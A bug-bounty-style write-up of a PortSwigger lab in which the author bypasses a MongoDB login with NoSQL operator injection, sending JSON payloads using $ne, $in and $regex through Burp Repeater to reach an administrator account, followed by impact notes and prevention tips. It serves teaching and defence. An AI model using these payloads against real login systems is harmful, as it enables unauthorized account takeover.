# Bypassing Login via NoSQL Operator Injection: A MongoDB Authentication Hack💉

**Author: Aditya Bhatt**
**Write-Up Type: Bug Bounty PoC**
**Target: PortSwigger Web Security Lab**
**Vulnerability: NoSQL Injection (Authentication Bypass via MongoDB Operators)**
**Difficulty: 🟠 Apprentice**
**Status: ✅ Lab Solved**

---

## 📌 TL;DR

In this lab, I exploit a classic NoSQL injection vulnerability in a MongoDB-powered login system by injecting operators like `$ne` (Not Equal) and `$regex`. These operators allow me to bypass both the username and password fields — eventually gaining unauthorized admin access. This bug, though simple in logic, is often overlooked in production applications and can lead to full account takeover — making it a **high-impact, high-reward** find in the wild.

---

## 🔍 Target: Lab Environment

**Lab URL:** [Exploiting NoSQL operator injection to bypass authentication](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication)
**Objective:** Log in as the `administrator` user using NoSQL injection.

---

## 🧠 Mindset: Think in MongoDB

This lab is based on MongoDB, where user inputs are interpreted as part of a JSON object. Insecure parsing allows attackers to inject MongoDB operators directly, causing unintended behavior.

In MongoDB, queries look like this:

```json
{
  "username": "wiener",
  "password": "peter"
}
```

However, since JSON allows embedding objects, I can inject:

```json
"username": { "$ne": "" }
```

This tells MongoDB: “Give me any user whose username is *not equal* to an empty string.” Combine that with a similarly crafted password condition and we can bypass authentication logic.

---

## 🧪 Step-by-Step PoC

### 1️⃣ Access the Lab & Login

I visit the lab and turn on **FoxyProxy** to route traffic through **BurpSuite**. Then I log in with the test credentials:

```
username: wiener
password: peter
```

I go to **Proxy > HTTP History**, locate the `POST /login` request, and send it to **Repeater**.

---

### 2️⃣ Understanding the Default Request

Initial login request:

```json
{
    "username":"wiener",
    "password":"peter"
}
```

The response is a **302 Redirect**, indicating successful login. Good — I’ve got a baseline.

---

### 3️⃣ Testing Injection: Password `$eq`

I modify the password field to test for operator injection support:

```json
{
    "username":"wiener",
    "password":{ "$eq":"peter" }
}
```

Boom — still a **302**. Operator injection is working.

---

### 4️⃣ Password `$ne` Bypass

Now I test with a negation:

```json
{
    "username":"wiener",
    "password":{ "$ne":"" }
}
```

I’m still logged in — even without the actual password. This confirms that the server evaluates the logic rather than the string values.

---

### 5️⃣ Admin Hunt Begins

I try a direct hit:

```json
{
    "username":"administrator",
    "password":{ "$ne":"" }
}
```

Sadly, I get a **200 OK** — no redirect — which means no login.

I broaden the search:

```json
{
    "username":{ "$in": ["admin", "ADMIN", "administrator", "ADMINISTRATOR"] },
    "password":{ "$ne":"" }
}
```

Still **200 OK**. No dice.

---

### 6️⃣ Regex to the Rescue

Finally, I bring in the big gun — `$regex`. I craft a regex to match any username starting with `"admin"`:

```json
{
    "username":{ "$regex":"^admin" },
    "password":{ "$ne":"" }
}
```

Bingo! I get a **302 Redirect** — I’m in!

Looking at the response confirms I’ve successfully bypassed authentication and logged in as an admin-level user.

---

### 7️⃣ Finishing Touch

I right-click the response, choose **“Show in Browser > In Current Session”**, and open the copied URL.

**🎉 Lab solved. Admin access achieved.**

---

## 🔒 Impact in Real-World Scenarios

This kind of NoSQL injection is **extremely dangerous** when:

* The backend does **not sanitize JSON input**.
* The application **relies entirely** on NoSQL-based authentication logic.
* Logging in as admin **leads to privilege escalation** or **data exfiltration**.

A real-life version of this vulnerability could result in:

* Account takeovers
* Access to internal dashboards
* Full database compromise

Platforms like **HackerOne** and **Bugcrowd** have multiple high-\$\$ reports for similar flaws. Don't underestimate these seemingly simple bugs.

---

## 🧰 Prevention Tips for Developers

* **Type-check and sanitize** all incoming JSON inputs.
* Never blindly parse user-supplied data as query objects.
* Use **whitelisting or input validation libraries** (e.g., Joi or express-validator).
* Implement **authentication logic on server-side**, not directly via NoSQL query logic.

---

## 🏁 Final Thoughts

This lab demonstrates how simple logic flaws in NoSQL can grant devastating access to attackers. With just a few tweaks in BurpSuite Repeater and a little regex magic, I’ve bypassed an authentication system and escalated my privileges to admin.

Stay curious, stay sharp — and remember, **never trust user input**.

---

## 🔗 Connect With Me

I regularly post about **ethical hacking**, **bug bounties**, and **real-world exploitation** techniques.

🛡 [GitHub](https://github.com/AdityaBhatt3010)
✍️ [Medium @adityabhatt3010](https://medium.com/@adityabhatt3010)
